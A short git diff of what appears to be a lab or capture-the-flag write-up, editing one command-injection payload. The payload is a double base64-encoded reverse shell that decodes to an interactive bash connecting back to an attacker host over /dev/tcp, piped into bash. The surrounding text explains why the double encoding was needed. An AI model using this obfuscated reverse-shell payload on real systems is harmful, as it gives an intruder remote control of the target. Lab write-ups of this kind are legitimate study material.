@@ -100,7 +100,7 @@ Which is really weird not sure why. So to troubleshoot I tried removing the last
 Looks like it is not printing the whole base64 encoded command. not sure why but that's the reason our reverse shell is not getting executed properly. From here I tried double `base64` encoding my payload and it worked 
 
 ```bash
-|echo+'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg='|base64+-d|base64+-d|bash`
+|echo 'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqSXhNQzg0TUNBd1BpWXg='|base64 -d|base64 -d|bash`
 ```
 
 ![](\assets\images\noname-pg\2022-07-27-16-46-09.png)
